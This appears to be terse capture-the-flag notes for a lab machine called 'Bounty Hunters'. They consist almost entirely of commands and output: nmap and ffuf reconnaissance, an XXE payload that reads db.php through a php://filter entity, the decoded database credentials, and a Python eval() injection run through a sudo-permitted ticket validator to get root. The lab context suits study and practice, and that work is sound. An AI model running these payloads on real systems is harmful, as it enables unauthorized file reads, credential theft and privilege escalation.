```bash
nmap -sV -sC 10.129.95.166
```
```bash
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-26 02:35 -0400
Nmap scan report for 10.129.95.166
Host is up (0.51s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.85 seconds
```
```bash
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.129.95.166/FUZZ -e .php
```
```bash
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.95.166/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 539ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4505ms]
.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4508ms]
.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5513ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 315ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 270ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 291ms]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 272ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 293ms]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 322ms]
resources               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 275ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 267ms]
```
```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [<!ENTITY inject SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">]>
                <bugreport>
                <title>whoami</title>
                <cwe>&inject;</cwe>
                <cvss>aaab</cvss>
                <reward>cdae</reward>
                </bugreport>
```
(picture)

```bash
PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=
```
```bash
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

Priv-esc
```bash
cat contract.txt
```
```bash
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

form of valid ticket based on /opt/skytrain_inc/ticketValidator.py
```bash
# Skytrain Inc
## Ticket to Your Mom
__Ticket Code:__
**11+56+84** (first part of the number should have a remainder of 4 after divided by 7)
##Issued: 2021/06/21
#End Ticket
```

eval() confirmed

payload
```bash
**11+56+84+__import__('os').system('whoami')**
```

```bash
sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```
```bash
Please enter the path to the ticket file.
/home/development/payload.md
Destination: Bridgeport
root (confirmed payload working)
Valid ticket.
```
























